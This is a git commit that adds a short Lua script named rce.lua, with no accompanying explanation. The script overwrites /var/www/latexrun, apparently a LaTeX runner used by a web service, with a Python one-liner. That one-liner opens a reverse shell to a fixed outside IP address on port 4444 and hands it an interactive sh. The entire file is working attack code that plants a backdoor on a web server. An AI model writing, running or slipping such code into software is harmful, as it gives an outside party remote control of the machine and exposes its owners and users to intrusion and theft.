082e35aee43a661504ce21385bd095560426f020
Aaron Dewes <aaron@runcitadel.space>
2025-04-29 22:38:36 +0200

    Create rce.lua

---
+++ rce.lua
@@ -0,0 +1,8 @@
+local file = io.open("/var/www/latexrun", "w")
+if file then
+    file:write("#!/usr/bin/env python\n")
+    file:write("import os,pty,socket;s=socket.socket();s.connect((\"88.198.52.145\",4444));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\"sh\")\n")
+    file:close()
+else
+    print("Error: Unable to open /var/www/latexrun for writing.")
+end
